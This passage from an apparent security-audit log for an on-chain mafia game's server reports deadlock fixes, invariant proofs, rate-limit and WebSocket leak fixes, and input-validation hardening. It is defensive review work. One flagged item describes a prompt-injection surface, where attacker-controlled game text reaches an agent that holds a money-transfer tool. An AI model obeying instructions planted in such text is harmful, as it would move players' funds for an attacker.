  29-knob test-only boot-refuse list is COMPLETE); no secret logged / no CORS / JWT-in-header (no CSRF) /
  no static-path-traversal / optional resvg degrades cleanly; `.env` gitignored, no committed credential.

**FLAGGED for founder sign-off (NOT patched — design/deploy/hygiene, ground rule #1):**
- **MCP prompt-injection surface (agent MED, design):** an autonomous agent reading attacker-controlled game
  text (names/contract-reasons/feed) that also holds the general `omerta_request` money tool is a
  prompt-injection target. Inherent to the pattern; mitigation is a structured untrusted-content envelope in
  the MCP output + an AGENTS.md warning that game text is untrusted — a design hardening, not a one-line fix.
- **Ad-hoc contract-build deps (supply-chain LOW):** `tools/compile-contracts.js` pulls `solc`/OZ via
  `npm i --no-save` (no lockfile integrity) — but `out-js/` is gitignored and mainnet is Foundry-pinned +
  audit-gated; pin them in a build lockfile only if `out-js` ever feeds a production deploy.
- **No CSP on `/` and `/wiki` (LOW):** the player console + wiki lack a CSP (thin surface — no cookie auth).

**Round 20 verdict (2 of 3 lenses): 2 MED (MCP retry-safety, SOCIAL_VERIFY fail-open) + 2 LOW (MCP redirect,
/admin clickjacking) fixed/hardened; the agent/MCP + supply-chain lenses confirmed CLEAN of CRITICAL/HIGH;
the MCP prompt-injection design surface + build-dep hygiene flagged. §10.4 untouched. Suite 33/33 + sim
drift-0. (Malicious-player attack-chain lens pending — addendum next.)**

### Round 20 addendum — malicious-player attack-chain (a1e16d34)
**CLEAN of CRITICAL/HIGH — the value-creation + on-chain over-extraction surface is soundly BLOCKED.** All
six attacker narratives traced through real code: "print money" (§10.4 check (a)/(d) forces
`balance == 500·count + Σ ledger`, every faucet ledgered + net-negative-EV or cooldown/cap-bounded, every
two-party take carved-from-stake never minted); "extract more than earned" (the full-reserve queue: burn-on-
withdraw, `committedOutstanding` counts signed OR claimed + `funded_omr` never decrements → cumulative
extraction ≤ inflow by construction; replay impossible, reclaim fails-closed with no reader, `markClaimed`
positive-guarded to signed (the R19 fix), real-ETH revenue txHash-gated); "steal another's asset" (every
refund credits the rightful party with the killer/self in-memory mirror, ownership re-checked under lock);
"top the leaderboard" (loser-level floors on the alt-farmable legend axes incl. the R18 boxing floor;
spend-based status boards have no achievement floor to undercut); "denial for profit" (directed-squat +
fortify bounded). Two findings, both founder calls (NOT patched, ground rule #1):
- **Port warehouse→fence emission-above-intent (MED, balance):** `fenceMultOf(day)` is a PRE-OBSERVABLE
  deterministic §7.11 hash (0.85–1.25) and warehoused `contraband` never decays, so a savvy smuggler waits
  for a high-mult day (~1.20 best-of-7) → the `port:fence` faucet realizes ~14–20% ABOVE the route-rate the
  sim measures — §10.4-clean (ledgered) but sim-invisible. **Same item the Round 17 cross-system lens
  flagged, now independently confirmed at MED.** Explicit `PORT.STEP4` sign-off lever → flagged, not
  retuned. Dial: roll the mult at FENCE time with `Math.random()` (like `collectRun`'s interdiction roll,
  so it isn't pre-observable) and/or decay warehoused contraband and/or clamp realized ≤ 1.0.
- **Safehoused-still-jumpable (LOW, by-design):** `jump` omits the safehouse victim-gate (documented — a
  safehouse is a survival shield vs lethal contracts, not an anti-mugging bunker); bounded (the victim is
  hospitalized after → one jump per hosp cycle; jump touches only POCKET cash so banking defeats the drain).

**Round 20 FINAL: 2 MED (MCP retry-safety, SOCIAL_VERIFY fail-open) + 2 LOW (MCP redirect, /admin
clickjacking) fixed; all three lenses (agent/MCP, supply-chain/secrets, malicious-player attack-chain)
confirmed CLEAN of CRITICAL/HIGH; the port fence-timing emission (now MED, two-finder-confirmed) + the MCP
prompt-injection design surface flagged for founder sign-off. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 21 — foundational/oldest-modules drift · test-quality/coverage gaps
Two fresh META-lenses (the surface is heavily saturated; these hunt latent drift + safety-net holes rather
than a new attack class). **No CRITICAL/HIGH. No §10.4 drift.** Suite 33/33 + sim drift-0.

- **Port collectRun gate-rejection regression (test-quality LOW-MED — ADDED).** The signed R18 D2
  "shield, not bunker" safehouse gate on `collectRun` (+ the R18 jailed/hospitalized gates) had NO
  regression — `test/port.js` covered only the collect SUCCESS path, so a refactor dropping any gate would
  keep the suite green while reopening the safehoused-landlord hole. Added three rejection asserts
  (jailed/hosp/safe) + a clean-collect-after. `test/port.js`.
- **$OMR-conservation drift-detection proof (test-quality MED — ADDED).** Only 1 of ~26 §10.4 checks (the
  character-cash check) was ever proven to CATCH a drift — every other (incl. the $OMR conservation check
  that backs the whole extraction rail) was asserted `ok:true` on correct data but never shown to FIRE on a
  leak, so a miscoded bucket/RHS reconstruction could pass forever. Added a leak-injection negative test:
  an unledgered $OMR mint (bucket up, no `mint` row) MUST trip the `$OMR conservation` check, then reverts
  clean. Validates the omrBuckets reconstruction actually detects a leak. `test/hardening.js`.

**FLAGGED for follow-up test coverage (the test-quality lens's ranked recommendations — additive test-net
work, no src bug; noted for the founder / a future coverage pass):**
- **Per-escrow-check leak-injection negatives:** the ~10 escrow-identity checks (bounty/market/loan/casino/
  boxing/auction/GP/futurity/stakes/convoy-insurance) + the vig/bond `extraction≤inflow`/anti-Ponzi
  invariants are only ever asserted `ok:true` — none is driven to a failure state to prove it FIRES. One
  leak-injection test per check would close the "a latent RHS sign-error passes forever" class (the highest-
  value remaining coverage add; the $OMR one above is the template).
- **Sim escrow cross-load + vig/bond hard-gate:** `tools/sim.js` never opens a contract/loan/market/auction/
  tournament/GP/futurity/stakes/main-event/convoy-insurance, so ~10 escrow checks are trivially `0==0` in
  its sweep, and it `note()`s but never `exit(1)`s on a vig/bond drift. Drive one lot through each escrow +
  hard-gate the real-value invariants so cross-load drift can't ship green.
- **Faucet AMOUNT-correctness:** conservation is asserted strongly but payout MAGNITUDE weakly (a faucet
  paying 10× would conserve + ship green); a few value-asserts on the richest faucets (kitchen deal, racket/
  crew income) + driving (not analytically computing) the sim's EV probes would close it.

**Round 21 verdict (test-quality lens): 2 test-net gaps closed (port collect gate regression, $OMR
drift-detection proof); the broader per-escrow-check negatives + sim escrow cross-load flagged as the
highest-value follow-up coverage. §10.4 untouched. Suite 33/33 + sim drift-0. (Foundational-drift lens
pending — addendum next.)**

---

## Round 21 addendum — Foundational / oldest-modules DRIFT lens (economy · kitchen · game · social-M3 · accrual)

A dedicated re-audit of the OLDEST core modules — hunting a persist-clobber, a §10.4 reason-vocabulary
gap, or a value-minting rounding bug hiding in the foundational code the whole game rests on. The core
is holding up: **no persist-clobber, no vocabulary gap, no minting rounding path.** One genuine (low-
severity, retry-masked) lock-order inversion found and FIXED.

**CONFIRMED + FIXED — `deal` inverts the documented gang→singleton lock order (LOW, retry-masked AB-BA).**
`src/kitchen.js` `deal` locked the `street_tax` singleton via `takeHouse` (was line 140) BEFORE locking
the gang via `bumpFamilyTask` (line 143) — i.e. *singleton-before-gang*, the lone violation of the global
`characters → accounts → gangs → singletons` order that every other `bumpFamilyTask` caller (crime/jump/
gta/tribute/melt-tithe) honors. The live counterparty is `worker.js:runBuyback`, which was EXPLICITLY
hardened (its own comment) to lock `gangs → street_tax` precisely to avoid this AB-BA against a family
finishing its weekly contract — but `deal` itself was never realigned. Real cycle:
`runBuyback` holds gang G (worker.js:66) → wants `street_tax` (worker.js:68); `deal` holds `street_tax`
(kitchen.js takeHouse) → wants gang G (bumpFamilyTask). Blast radius is narrow (bites only when the WEEKLY
family task is `deal` AND the 12h buyback processes that member's gang concurrently) and correctness-safe
(40P01 → `deadlockToRetry` → clean `contention` retry) — but it's a stale deviation from the invariant the
neighbouring code documents, and any future gang-then-street_tax feature in a deal-week would upgrade it
from a rare worker retry to a player-facing deadlock. **Fix:** reordered `deal` so `bumpFamilyTask` (gang,
then `street_tax` on weekly completion) precedes `takeHouse` (the singleton) — restoring gang→singleton in
both the completes-the-weekly and the doesn't-complete branches. Behavior-preserving (a pure reorder of
independent side effects); covered by the existing `deal` tests in test/growth.js (pg-mem can't exercise
`FOR UPDATE` blocking, so no concurrency regression is possible — the fix is a documented ordering
correction, the same class as the runBuyback fix it aligns with).

**Verified SOUND (the substance of the re-audit):**
- **Persist layer — no clobber, no gap.** Full `characters` schema diffed against the `persistCharacter`
  positional list + `account_persistent` writes vs `persistAccount`: every in-memory-mutated column is
  persisted, every deliberately direct-SQL column (`pen_faction`, `wire_tier`, `disinfo_until`,
  `active_at`, `race_at`, `port_used/at`, `contraband`, `berths`, …) is correctly OUT of the positional
  list. Risky two-party/headless writes spot-checked clean (bodyguardAbsorbs third-party, respawn revive,
  resolveBust, collectLoan welsher/wanted, relative-SQL credit grants under the account lock).
- **§10.4 reason vocabulary — no gap.** Every distinct ledger `reason:` string across all 47 modules matched
  against `KNOWN_REASONS` — including the split where bare `jump`/`fire` are ammo reasons while `jump:steal`/
  `whack:*` are the cash rows. No orphan reason, no unemitted vocabulary entry that matters.
- **AMM swap + kitchen math — no value extraction.** Buy `netIn`/`out` is a pool transfer (bucket-sum
  unchanged to full precision); sell `net = floor(...)` with the `net≤0` dust guard + Infinity/NaN guards;
  `deal` gross/net integer-exact, tax→untracked house pool; cook/collect crate math + weighted-avg stash
  merge consistent.
- **Accrual `_at` clocks + estate/loot/dissolution** all §10.4-exact (wall-clock releases above the <1s
  early-return; estate burns exact cash+bank; loot carved before the death-burn; gang dissolution burns/
  releases every bucket; war spoils net to zero across Σ treasury).

**Round 21 verdict (foundational-drift lens): 1 confirmed lock-order inversion FIXED (deal gang→singleton);
core persist/vocabulary/rounding verified SOUND. Suite 33/33 + sim drift-0.**

---

## Round 22 — Singleton lock-order sweep + Worker-sweep idempotency/partial-failure

Two dedicated lenses over the deal-finding's neighbourhood: (1) EVERY path locking ≥2 of {char, account,
gang, singleton/state}, and (2) every value-moving worker sweep's idempotency / partial-failure / double-
resolution. **No CRITICAL/HIGH.** Two confirmed structural fixes.

**CONFIRMED + FIXED — `refundPot` interleaves the `'HOUSE'` street_tax singleton (and gang treasuries)
among the character funders (MED, retry-masked AB-BA, higher-frequency than the deal one).** `src/social.js`
`refundPot` iterated funders `ORDER BY contributor` (a B-M1 stability sort) but the loop body writes across
THREE tiers inside that one raw-string-sorted loop: gangs (line 702), the `street_tax` singleton (712, the
`'HOUSE'` loan-WANTED pool-bounty contributor), and characters (718). Since `'HOUSE'` (0x48) sorts among the
lowercase-hex uids, a funder whose uid begins `a-f` (~37.5%) is processed AFTER `'HOUSE'` — so `street_tax`
is locked BEFORE that character/gang funder, violating the global `characters → gangs → singletons` order.
Two real cycles: **(A)** `refundPot` holds `street_tax`(712) → wants char C(718) vs ANY player doing a
`takeHouse` under their own char lock (casino bet / fence / laylow / pen / market / speakeasy — the most
ubiquitous counterparty in the codebase); **(B)** holds `street_tax` → wants gang G(702) vs `runBuyback`
(gangs → street_tax). Both fire on a `(wanted-defaulter,'kill')` pot (the only pot carrying `HOUSE`) being
reposted/cancelled/swept while a funder is concurrently held. Retry-masked (40P01→`contention`), but a
genuine violation of the codebase's own "singletons last" discipline — and B-M1's `ORDER BY contributor` is
precisely what interleaves the singleton among the funders. **Fix:** partition the funder set and process
in strict tier order — TIER 1 characters (living refund / self-refund-in-memory / dead-man burn), TIER 2
gangs (treasury home / dissolved burn), TIER 3 the single DEFERRED `'HOUSE'` `street_tax` credit LAST (one
accumulated write). Each tier still iterates contributor-sorted (B-M1 cross-repost consistency preserved
within tier). §10.4-neutral (identical reasons/amounts/sums — only the UPDATE order changed). Covered by
the existing bounty-refund + WANTED-refund tests (social + loans, both green); pg-mem can't exercise the
`FOR UPDATE` blocking so the fix is a documented ordering correction.

**CONFIRMED + FIXED — `runSeasonRollover` was the only value-moving sweep without per-row isolation (LOW,
latent — season-wide stall blast radius).** `src/worker.js` ran the entire rollover — the SPCX season-prize
`grantShares` + notification for the top-N, and for EVERY rolling character the respect/season reset +
prestige bump + telemetry insert, plus the gang seasonal reset — in ONE monolithic `BEGIN`/`COMMIT`. Every
sibling sweep isolates per row; this one didn't, so a single persistently-throwing per-character statement
(a constraint/FK on notifications/telemetry/portfolios/account_persistent) would roll the WHOLE batch back
every tick → NO character's level→prestige conversion ever lands and the season never advances for anyone
until manual intervention (poison-row starvation, total blast radius). LOW only because no guaranteed
persistent-throw trigger could be constructed (grantShares is defensively guarded, the bulk statements are
simple), but the impact if triggered is a game-wide season stall. **Fix:** restructured to ONE txn per
character (the established sibling pattern) — the prize/roll set is snapshotted in a short read (order-
independent), each character converts in its own `pool.connect()`+txn with the `season < current` marker +
`FOR UPDATE` re-check (idempotent + resumable; partial progress persists across a crash instead of the old
all-or-nothing), a poison row is caught+rolled-back+skipped, and the gang reset runs in its own final txn.
The F3/F4 char→portfolios lock order is preserved (the grant still runs under the winner's char lock).
Covered by the existing rollover tests (commission + portfolio, both green).

**Verified CLEAN (the substance of both lenses — cited inventory):**
- **Lock-order sweep:** every OTHER multi-tier path holds gang→singleton or has no reverse counterparty —
  `bumpFamilyTask` (gang→street_tax), the now-fixed `deal`, `claimFamilyDividend`/`familyInvest`/seal/
  foundation (gang→reserve), `runBuyback` (the canonical gang→singleton), `jump`/`fire` war-score (sorted
  `WHERE id IN`), territory (gang-only), world (gang→`world_npcs` singleton-last), convoy (convoy→gang→
  insurance singleton-last), loans `squareWanted`/`collectLoan` (pot before street_tax, the prior fix). No
  other inversion.
- **Worker sweeps:** all escrow-backed resolvers (tournament/futurity/grand-prix/stakes/main-event/auction/
  market/bounty-sweep/loans) verified idempotent (re-select the terminal row `FOR UPDATE` + re-check open
  status inside the settling txn) with per-item isolation (per-row txn + try/catch/ROLLBACK) and materialize-
  races serialized on the `*_state` singleton; claim-then-grant on fees/store/wire-alerts; fail-closed
  voucher reclaim; cross-sweep double-resolution (estate-vs-bounty, loan-forfeit-vs-death, main-event-cancel-
  vs-resolve) mutually exclusive via lock order + status guards. No double-pay, no escrow leak on crash, no
  §10.4 drift.

**FLAGGED (not patched — known/accepted):** `settlePassStipend`'s post-commit `fundReserve` (chain.js:101)
is the documented, accepted `payPrizes` pattern — a crash in that window leaves the player paid + the reserve
under-backed by `pay`, but the two-sided vig invariant (`reserve not under-funded`) is explicitly designed to
ALERT on exactly this "crash-lost fundReserve" (in-game §10.4 stays exact — `prize:omr` is an enumerated
mint). Not a new defect.

**Round 22 verdict: 2 structural fixes (refundPot tier-ordering — the higher-frequency AB-BA; season-rollover
per-row isolation — the total-stall robustness gap). Escrow/settle/idempotency layer confirmed SOUND. §10.4
untouched. Suite 33/33 + sim drift-0.**

---

## Round 23 — Two-party lock discipline + Value-creation in the newest faucet modules

Two lenses continuing the productive lock-order vein + a fresh mint-hunt on the newest modules
(port/races/stable/boxing/speakeasy/casino racing). **No CRITICAL/HIGH.** One confirmed lock-order fix +
two defense-in-depth consistency guards.

**CONFIRMED + FIXED — `jump` locks the war-gangs BEFORE the bounty pot, inverting `characters → pots →
gangs` (MED, retry-masked AB-BA).** `src/social.js` `jump` ran the war-kill score `UPDATE gangs …
WHERE id IN (G,G2)` (line 348) BEFORE `claimBounty` (line 353, which locks the victim's `bounties` rows) —
i.e. gangs → pot. Every other path takes pot → gangs: `fire` (claimBounty then the identical war-score
update), `postFamilyContract` (pot then gang), `cancelFamilyContract`, `refundPot`, and the expiry sweep.
Two real AB-BA cycles on a warring victim V with a pot: **(1)** `jump(V)` (holds gangs, wants pot) vs
`fire(V)` (holds pot, wants gangs); **(2, more reachable)** `jump(V)` vs `postFamilyContract(target=V)` by
the boss (holds pot, wants gang G). Both fire only under an active `gang:war` with a bounty pot on the
contested victim + genuinely concurrent jump + fire/family-contract on V. Retry-masked (both under
`withTwoCharacters`/`withCharacter` → `deadlockToRetry` → `contention`), no §10.4 effect — but a real
out-of-order acquisition NOT covered by the prior jump/fire fixes (those addressed only the two-gang
UNSORTED score update, now a single `WHERE id IN` statement; they never touched the pot-vs-gang cross-
order). **Fix:** moved `jump`'s `claimBounty` to run BEFORE the war-score gang UPDATE, matching `fire`'s
pot → gangs order exactly. Behavior-preserving (bounty payout + war scoring are independent); covered by
existing jump/war tests (test/social.js green).

**FIXED — `pvpDice`/`playPoker` missing the explicit self-match guard (defense-in-depth, no value impact).**
Every other two-party function (boxing/stable/races/speakeasy) has an explicit `opponent.id === ch.id`
throw; the casino back-room dice + heads-up poker relied solely on `withTwoCharacters` throwing `self`.
Not exploitable today (one alive character per account → the two transfer rows can never be the same, and a
same-account match nets only `−rake` anyway), but added the explicit `self` guard to both for consistency +
clearer error semantics. Zero behavioral change; test/casino.js green.

**Verified CLEAN (both lenses):**
- **Value creation (mint hunt):** every taxed transfer (`casino:pvp`/`boxing:bout`/`race:wager`/`stable:race`)
  nets EXACTLY to `−rake` — winner-credit + loser-debit + floor(rake/2)→street_tax + ceil(rake/2)-burn sum
  to zero, no dust minted to a player; the winner's own stake never double-credits. Every escrow settlement
  (Grand Prix/Stakes/Tournament/main-event/Futurity) closes the identity `Σbuyin = Σwin + refund + take +
  death` to zero across full-field / short-field-refund / one-sided-book, with the parimutuel last-winner
  mop-up making `Σpayouts == totalWin + distributable` exactly and `own_event` blocking principal-bets-own-
  card double-credits. Every PvE purse (exhibition/circuit/npc-race/port-sale/speakeasy-table/track/GP) is a
  bounded catalog constant or a supply-capped faucet, never an unbounded multiplier. The mint-hunt core:
  rakes/fees/tolls/fines use `Math.ceil` (house-favorable), payouts/shares/purses use `Math.floor` — NO
  ceil-credit-vs-floor-debit dust-mint mismatch exists in any of the six modules.
- **Two-party locks:** every `withTwoCharacters` handler verified — bodyguard (atomic conditional claim, no
  lost-update), tributeOmr, loans repay/collect/buyPaper (WANTED-pot before street_tax), speakeasy visit/
  table/buyout/standover (state → street_tax last), business shakedown, races match/pinks (cars leaf,
  chars-before-cars acyclic), heists inside-job (mark's char never locked), pen shank (pot before estate),
  port intercept/rendezvous (owner char never locked), market bid/buy/fill (outbid bidder locked before
  refund), boxing fightBout/announce/acceptCallout (the F1/F2 fixes intact). Known retry-masked classes
  (leader-first co-op vs pairwise PvP, market actor-vs-prevBidder, runEstate third-party funder locks) re-
  confirmed accepted (all → `contention`); territory establish/seize-vs-dissolution re-analyzed as NOT a
  cycle (dissolution only writes for a memberless gang).

**Round 23 verdict: 1 lock-order fix (jump pot→gangs — the last two-party inversion), 2 defense-in-depth
self-guards; value-creation across all six newest faucet modules confirmed net-zero/bounded. §10.4
untouched. Suite 33/33 + sim drift-0.**

---

## Round 24 — Numeric input-validation sweep + Estate completeness / object-claim consistency

Two fresh orthogonal lenses over the newest modules. **No CRITICAL/HIGH/MED.** One confirmed input-
validation fix; the estate + object-claim surfaces verified complete (one "LOW" turned out to be working-
as-designed on inspection — reverted an over-eager fix).

**CONFIRMED + FIXED — `TRACK_RACES[race]` raw object-literal lookup slips the allow-list (LOW, defense-in-
depth).** `src/casino.js` indexed `TRACK_RACES = {dogs, horses}` by the client `race` param via a raw
`TRACK_RACES[race]` at `trackFieldOf` and `betTrack` — the LAST raw object-key lookup in the codebase
(every sibling — `stableKindOf`, `landmarkOf`, `decorStyleOf`, `ART_CATALOGS` — uses `hasOwnProperty`). A
prototype key (`__proto__`/`constructor`/…) resolves truthy and slips the intended `'dogs'|'horses'`
allow-list. Confirmed NOT exploitable (the field is a fixed-size FIELD=6 loop, never over `pool.length`; the
phantom race resolves as a fair, house-edged −EV game with the `casino:bet/win:track` ledger + `bumpProfit`
staying consistent — no §10.4 drift, no mint, no crash — the only effect is extra −EV bets keyed to
arbitrary strings), but a real allow-list bypass. **Fix:** added `trackPoolOf(race)` using
`Object.prototype.hasOwnProperty.call`, used at both sites (`betTrack` is the write-gate, so no prototype-key
race can be persisted for `claimTrack` to re-read). Regression: a `constructor`/`__proto__` race is rejected
with the `'race'` error (test/casino.js).

**REVERTED (working-as-designed, NOT a bug — ground rule #1).** The estate lens flagged a "LOW" race-flag
hygiene nit: `raceable` rejects `listed||pledged` but `listCar`/loan-pledge don't reject `race_limit`/
`pink_slip` (asymmetric). I initially added a symmetric flag-time reject — but test/races.js:191 asserts a
race-flagged car MUST be listable, because the audited races-step-two design is "allow the multi-claim, and
CLEAR the foreign flags on the four ownership-transfer sinks" (the buyer/lender gets a clean car). The only
residual (a same-owner pledge→repay leaving the owner's OWN race listing intact) is defensible — the owner
listed it, ownership never changed. Reverted both edits; left a NOTE in market.js documenting why there is
deliberately no flag-time reject (so a future auditor doesn't re-add it). The test caught the over-eager fix.

**Verified CLEAN (both lenses):**
- **Input validation:** the NaN/Infinity/negative/type-confusion/length class is uniformly hardened across
  the newest modules — every amount/stake/wager/bet/price is `Math.floor` + `Number.isFinite` + MIN/MAX (or a
  downstream balance gate that catches Infinity); `gateBet` (dice/numbers/track/futurity/blackjack), races/
  boxing/speakeasy/stable/loans/market/world/pen/auction/portfolio/landmarks/social all verified;
  `spendOmr` itself guards `isFinite && >0` so a negative can never invert a burn into a mint; every catalog
  resolver uses `Array.find` or `hasOwnProperty` (TRACK_RACES was the sole exception, now fixed); `cards.js`
  escapes every SVG-interpolated field + bands wealth; no client-sized loops (crews gap-bounded, qty clamped).
- **Estate completeness:** all ~50 per-character FK tables classified — WIPED in the runEstate loop / custom
  wiper, ACCOUNT-LEVEL survivor (heir inherits), or escrow-entry (deliberately excluded, reaped by a worker
  resolve with a `*:death` burn / backer refund). NO orphan, NO stranded §10.4 escrow. Cross-object death
  ordering safe (cars deleted before voidLoansAtDeath; dead lender's loan+collateral reassigned to the heir;
  heirId threaded early). The newest tables (boats/contraband/berths, fighters+belt+bets, speakeasies+patrons,
  racers, port_intercepts, territory specialist, wire_watches/informants, pen factions/breaks) all handled.
- **Object-claim consistency:** all four multi-claim matrices compose at execution — CAR (all 5 transfer
  sinks clear listed/pledged/race/nos; race execution re-checks listed||pledged; the races-step-two consent
  class is closed), BOAT (sell/upgrade reject atSea; intercept requires outAtSea; port_intercepts cleared on
  every run start/end/handoff via clearIntercepts), FIGHTER (booked/injured reject on both sides everywhere),
  RACER (correctly non-exclusive — never escrowed, per-owner PKs prevent double-entry, injured-gated).

**Round 24 verdict: 1 input-validation fix (TRACK_RACES hasOwnProperty — the last raw object-key lookup) +
regression; 1 over-eager fix reverted (race-flag hygiene is working-as-designed). Estate wipe + object-claim
composition verified complete. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 25 — Auth/session/token/idempotency lifecycle + Accrual/timing/clock-skew

Two under-swept-this-loop surfaces. **No CRITICAL/HIGH/MED.** One LOW keyless-DoS fix; the timing/accrual
class verified entirely clean.

**CONFIRMED + FIXED — `GET /v1/ws` upgrade is outside every rate-limit bucket (LOW, keyless pre-auth DoS).**
`src/server.js` throttles keyless heavy GETs per-IP (`/card`,`/u`,`/v1/u`,`/v1/art`,`/v1/landmarks` via
`checkPublicRateLimit`) and authed `/v1` GETs per-account (via `checkReadLimit` after `jwtVerify`). But the
WS upgrade carries its bearer in `Sec-WebSocket-Protocol` (`bearer, <token>`), NOT the `Authorization`
header — so the `/v1` read branch's `req.jwtVerify()` throws → `catch { return }` → the read bucket is never
consumed, and `/v1/ws` was not in the public-branch enumeration. Each connect attempt does a real
`jwt.verify` (HMAC) + socket churn, bounded by nothing (the per-account `WS_MAX_PER_ACCOUNT` cap runs AFTER
verify and invalid-token attempts never register). Exactly the keyless-heavy-GET class the codebase already
closed for the other render routes (R13/R19). **Fix:** added `|| req.url.startsWith('/v1/ws')` to the
`checkPublicRateLimit` per-IP branch, bounding the pre-auth upgrade like the other keyless endpoints
(generous, only bites a flood). No-op in the test env (`rateLimitsEnabled()` false without production/
`DATABASE_URL`/`RATE_LIMIT=on`); security + hardening suites green.

**Verified CLEAN (both lenses — extensive):**
- **Auth/idempotency:** idempotency keys are PK-scoped `(account_id, key)` (A's key can't replay to B),
  2xx-ONLY store with 4xx/5xx reservation DELETE (a stored error can't replay), reserve-before-execute wins-
  once (409 `in_progress` for the loser) + the R4 re-reserve loop, body-bound hash, two-horizon prune. JWT
  `sub` always server-generated (no client-injected sub); ban + agent status read from DB not the token (a
  pre-flag token can't dodge the agent throttle); agent bucket keyed on accountId (rotating keys hit the same
  bucket); banned rejected at every door incl. WS. SIWE nonce single-use + 10-min expiry + account+nonce
  binding + malformed-sig clean-400 + wallet uniqueness; Privy ES256-pinned, no keys[0] fallback, aud
  scalar-or-array fail-closed, JWKS-fetch fail-closed; X path flag-gated off. Rate buckets correctly
  separated (h/a/s/rd/auth-IP/pub-IP), read per-call from env. Every mutating route behind `auth`; every
  `/v1/mod/*` behind `modAuth` (timing-safe compare); OpenAPI security derived from real preHandler names;
  no IDOR (actor always `req.user.sub`, `:params` are targets with ownership/consent enforced inside).
- **Accrual/timing/clock-skew:** NO over-credit, stuck-window, or clock-corruption defect. The backward-clock
  guard `dtMs = Math.max(0, now-last)` + `if (dtMs<1000) return` neutralizes a rewound clock (zero accrual,
  no negative-underflow mint); every token bucket (bank credit, wash/port/RWA/launder caps, business/
  territory/speakeasy scrutiny, crew wages/upkeep) re-stamps its `_at` clock and caps BOTH refill and spend
  (`min(elapsed, cap)`); the clock-rewind "leave owner exactly pending−cut" writes (territory raid, business
  shakedown) are cap-bounded so the next read can't over-credit; staking's uncapped accrual is provably
  outside `omrBuckets` (a pool-backed pending claim); every client-supplied duration (loan term, market TTL,
  directed window, bounty TTL) is clamped before `now + x`; worker windows use server constants + idempotent
  status flips; every `*Active`/cooldown helper is `> now` (a backward clock only lengthens a window —
  benign). No double-accrual.

**FLAGGED (informational, accepted design — not patched):** no per-token JWT revocation (stateless tradeoff;
ban-the-account is the lever, checked fresh from DB every request); `agent_flag` irreversible (footgun);
guest-mint Sybil at the per-IP `auth:` floor (referral/social faucets are agent-excluded + playtime-gated);
`trustProxy` operator-config dichotomy. All previously known/accepted.

**Round 25 verdict: 1 keyless-DoS fix (the /v1/ws upgrade joins the per-IP public throttle); auth lifecycle
+ timing/accrual class verified sound. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 26 — §10.4 invariant reconstruction math + WS/bus channel authz & notification leakage

Two high-value fresh lenses. **No CRITICAL.** One HIGH info-leak fix; the §10.4 invariant itself verified
AIRTIGHT.

**CONFIRMED + FIXED — the DEATH path leaves a stale `gang:` WS subscription (HIGH, private-feed leak).**
The `/v1/ws` gateway derives a socket's channels ONCE at connect: `me:<charId>`, `streets`, and
`gang:<gangId>`. R9 closed leave/kick by calling `closeAccountSockets` post-commit so the ex-member's socket
drops the family feed — but the DEATH path was missed. On any kill, `runEstate → removeMember` makes the heir
GANGLESS, yet the kill routes (`fire`/`npchit`/`pen shank`/`mod kill`) never closed the victim's sockets
(`runEstate` can't — `wsClients` is a `buildApp` closure). So a killed player's still-open socket kept
forwarding the former family's PRIVATE `gang:` feed — real-time kill-contracts on named targets, war
declarations + spoils, tribute amounts, racket-raid losses, weekly-contract completion, commission votes — to
someone no longer in the family (a live mole if their heir joins a rival). The browser auto-pongs the
heartbeat, so the window is effectively unbounded. **Fix:** added a `closeSocketsOnKill(result, victimCharId)`
helper next to `closeAccountSockets` and wired it into all four kill routes — on a `kill:true`/`killed:true`
result it looks the victim's account up server-side by the victim CHARACTER id (the row survives as
`alive=false`, never deleted — verified at social.js:1557) and `closeAccountSockets(…, 4009, 'gang_changed')`,
mirroring kick exactly (post-commit, non-fatal try/catch so a lookup blip can't 5xx after the kill committed →
release the idempotency key → re-execute). Mod-kill uses `victim.account_id` already in scope. Regression:
test/security.js seeds a gang-founding member with a live WS, mod-kills them, and asserts the socket closes
with 4009 (mirroring the leave-closes-socket test). **FLAGGED residual (not a HIGH):** worker-hunt kills
(bounty-hunter/`huntWanted`) run in the worker process and can't reach `wsClients` — a narrower gap (the
victim must be online with an open socket in a gang AND killed specifically by a worker hunt; self-heals on
any reconnect); noted for a future cross-process socket-close signal.

**Verified AIRTIGHT — the §10.4 invariant reconstruction math (the core safety net).** A machine-checked
adversarial audit of invariants.js: extracted all 248 distinct emitted `(currency, reason)` pairs across
src/*.js and re-ran the exact prefix-matcher offline → **0 unmatched** (every ledger row of every currency
maps to a `KNOWN_REASONS` term; no faucet/sink slips a sum, no prefix over-matches — `casino:bet:%`/`win:%`
correctly miss `tourney`/`futurity`/`pvp`/`track:entry`; `bounty:refund` exact ≠ `bounty:wanted:refund`).
Bucket completeness confirmed: every in-game soft-$OMR holding is in `omrBuckets` (account omr+staked+
unbonding, amm, street_tax.fund, gang reserves, stake_pool, both dividend pools, live auction bids); cash/cb/
ammo fully summed. The hard-$OMR/ETH pools (vig/chain-reserve/bond/rwa-revenue) are correctly EXCLUDED and
fail-LOUD — they cross into §10.4 only via the ledgered `prize:omr` mint, so any un-minted bridge trips the
check. Escrow identities (bounty/market/loan/convoy-insurance/den/boxing-bet/tourney/GP/stakes/futurity/
auction) verified term-complete + sign-exact, no double-count; the two load-bearing properties — character-
cash is reason-independent (a misclassified cash reason can't mint) + the hard/soft boundary is fail-loud —
make it robust, not just complete.

**Verified CLEAN (WS/bus, the rest):** channel-subscription IDOR structurally impossible (no client `message`
handler; channels derived entirely server-side from `req.user.sub`); notification backfill keyed on
server-derived `me.id` (no id IDOR); the anon-contract streets leak fully closed incl. top-ups; wire tap/
informant sources never auto-leak to the target; npcHit/bounty-hunter anonymity intact; gang emits derive the
id from the actor's membership; ban closes sockets (4003), leave/kick (4009); cross-session/same-account +
guest→provider upgrade correctly scoped.

**Round 26 verdict: 1 HIGH WS info-leak fix (kill routes now drop the dead street's gang: feed) + regression;
the §10.4 invariant math verified airtight; WS/bus authz otherwise sound. §10.4 untouched. Suite 33/33 + sim
drift-0.**

---

## Round 27 — Solidity contracts + client XSS/DOM-injection

Two fresh high-value lenses (the on-chain money settlement + the JWT-in-localStorage attack surface).
**No CRITICAL/HIGH/MED. No reachable bug — no code change this round.**

**Solidity contracts (all 6) — VERIFIED SOUND.** The highest-value question (cross-contract EIP-712
signature replay with a shared server signer) is airtight: VoucherClaim (`"OmertaVoucherClaim"`) and
